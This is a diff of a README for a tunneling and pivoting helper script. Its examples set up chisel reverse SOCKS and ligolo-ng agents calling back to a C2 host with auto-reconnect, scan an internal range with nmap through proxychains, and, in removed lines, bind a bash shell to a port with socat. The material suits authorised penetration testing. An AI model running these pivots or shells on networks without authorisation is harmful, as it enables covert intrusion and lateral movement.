@@ -1,8 +1,19 @@
 # Tunnel Helper
 
-Cross-platform installer/helper for tunneling and pivoting tools.
+Cross-platform installer, configurator, and connector for pivot/tunneling tools.
 
-## Supported Providers
+## Main Goal
+
+The script is now centered on **operational workflow** instead of just install:
+
+- `install`: get the tool
+- `configure`: generate config / set auth
+- `connect`: run the tunnel/pivot command
+- `all`: do install + configure + connect in one command
+
+It can also auto-reconnect when a connection drops.
+
+## Providers
 
 - `cloudflared`
 - `ngrok`
@@ -16,154 +27,141 @@ Cross-platform installer/helper for tunneling and pivoting tools.
 - `frp`
 - `ligolo-ng`
 
-## Quick Commands
+## Quick Help
 
 ```bash
-cd "Tunnel Helper"
 python3 tunnel_setup.py --help
 python3 tunnel_setup.py --help-examples
 ```
 
-Install specific provider:
+## Core Flags
+
+- `--provider <name>`
+- `--action install|configure|connect|all` (default `all`)
+- `--keep-connected` (restart on disconnect)
+- `--retry-delay <seconds>` (default `5`)
+- `--connect-command "..."` (override generated connect command)
+
+Shared pivot params:
+
+- `--role server|client`
+- `--target-host`, `--target-port`
+- `--listen-host`, `--listen-port`
+- `--remote-host`, `--remote-port`
+- `--shared-secret`
+
+## Examples
+
+### Chisel reverse SOCKS (kept connected)
+
+Server:
 
 ```bash
-python3 tunnel_setup.py --provider socat
-python3 tunnel_setup.py --provider chisel
-python3 tunnel_setup.py --provider bore
-python3 tunnel_setup.py --provider rathole
-python3 tunnel_setup.py --provider frp
-python3 tunnel_setup.py --provider ligolo-ng
+python3 tunnel_setup.py \
+  --provider chisel \
+  --action all \
+  --role server \
+  --listen-port 8001 \
+  --keep-connected
 ```
 
-## Pivoting Workflows
-
-### 1) SSH Dynamic + Proxychains (classic SOCKS pivot)
+Client:
 
 ```bash
-python3 tunnel_setup.py --provider ssh-dynamic --ssh-user alice --ssh-host jump.example.com --socks-port 1080 --start
-python3 tunnel_setup.py --provider proxychains --proxy-port 1080 --write-proxychains-config
-proxychains4 nmap -sT 10.10.10.0/24
+python3 tunnel_setup.py \
+  --provider chisel \
+  --action all \
+  --role client \
+  --target-host <server-ip> \
+  --target-port 8001 \
+  --chisel-remote R:1080:socks \
+  --keep-connected
 ```
 
-### 2) Socat local/remote forwarding
-
-Install:
+### SSH dynamic SOCKS with auto-reconnect
 
 ```bash
-python3 tunnel_setup.py --provider socat
+python3 tunnel_setup.py \
+  --provider ssh-dynamic \
+  --action connect \
+  --ssh-user alice \
+  --ssh-host jump.example.com \
+  --socks-port 1080 \
+  --keep-connected
 ```
 
-Examples:
+### Proxychains config + usage
 
 ```bash
-# Local forward: listen locally and forward to internal target
-socat TCP-LISTEN:8443,fork,reuseaddr TCP:10.10.10.5:443
-
-# Reverse shell transport example (lab use)
-socat TCP-LISTEN:9001,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
+python3 tunnel_setup.py --provider proxychains --action configure --proxy-port 1080
+python3 tunnel_setup.py --provider proxychains --action connect --proxychains-command "nmap -sT 10.10.10.0/24"
 ```
 
-### 3) Chisel reverse SOCKS tunnel
+### FRP server/client with generated configs
 
-Install:
+Server:
 
 ```bash
-python3 tunnel_setup.py --provider chisel
+python3 tunnel_setup.py \
+  --provider frp \
+  --action all \
+  --role server \
+  --listen-port 7000 \
+  --shared-secret change-me
 ```
 
-Use:
+Client:
 
 ```bash
-# On C2/VPS
-chisel server --reverse -p 8001
-
-# On pivot host
-chisel client <C2-IP>:8001 R:1080:socks
-
-# From operator box
-proxychains4 ssh user@10.10.10.20
+python3 tunnel_setup.py \
+  --provider frp \
+  --action all \
+  --role client \
+  --target-host <frps-ip> \
+  --target-port 7000 \
+  --remote-host 127.0.0.1 \
+  --remote-port 22 \
+  --listen-port 6000 \
+  --shared-secret change-me
 ```
 
-### 4) Bore quick remote forwarding
+### Rathole server/client with generated configs
 
-Install:
+Server:
 
 ```bash
-python3 tunnel_setup.py --provider bore
+python3 tunnel_setup.py --provider rathole --action all --role server --listen-port 7000 --remote-port 6000 --shared-secret change-me
 ```
 
-Use:
+Client:
 
 ```bash
-# Expose local service via bore relay
-bore local 8080 --to bore.pub
+python3 tunnel_setup.py --provider rathole --action all --role client --target-host <server-ip> --target-port 7000 --remote-host 127.0.0.1 --remote-port 22 --shared-secret change-me
 ```
 
-### 5) Rathole config-driven reverse tunnel
+### Ligolo-ng
 
-Install:
+Server side:
 
 ```bash
-python3 tunnel_setup.py --provider rathole
+python3 tunnel_setup.py --provider ligolo-ng --action connect --role server --keep-connected
 ```
 
-Use:
+Agent side:
 
 ```bash
-# Server side
-rathole server.toml
-
-# Client side
-rathole client.toml
+python3 tunnel_setup.py --provider ligolo-ng --action connect --role client --target-host <c2-ip> --target-port 11601 --keep-connected
 ```
 
-### 6) FRP (frps/frpc)
+## Config Output
 
-Install:
+Generated configs are stored under:
 
-```bash
-python3 tunnel_setup.py --provider frp
-```
-
-Use:
-
-```bash
-# Server (internet reachable)
-frps -c frps.toml
-
-# Client (inside network)
-frpc -c frpc.toml
-```
-
-### 7) Ligolo-ng (advanced pivoting)
-
-Install:
-
-```bash
-python3 tunnel_setup.py --provider ligolo-ng
-```
-
-Use:
-
-```bash
-# C2 side (proxy binary)
-proxy -selfcert
-
-# Agent side
-agent -connect <C2-IP>:11601 -ignore-cert
-```
+- Default: `~/.tunnel_helper`
+- Override: `--config-dir <path>`
 
 ## Notes
 
-- GitHub-based providers (`chisel`, `bore`, `rathole`, `frp`, `ligolo-ng`) are pulled from latest release assets using OS/arch matching.
-- Default binary install dir:
-  - Linux/macOS: `~/.local/bin`
-  - Windows: `~/bin`
-- Add install dir to `PATH` if command is not found.
-- `socat`/`proxychains` may require `sudo` for package install.
-
-## Troubleshooting
-
-- Run: `python3 tunnel_setup.py --help-examples`
-- If wrong binary is selected on niche platforms, set `--install-dir`, then verify with `--version`.
-- If `proxychains4` is missing, try `proxychains` command name.
+- For `ngrok`, pass authtoken in configure/all mode: `--ngrok-authtoken <token>`.
+- If command names differ in your distro/path, use `--connect-command`.
+- `--keep-connected` is best for unstable links/pivots.
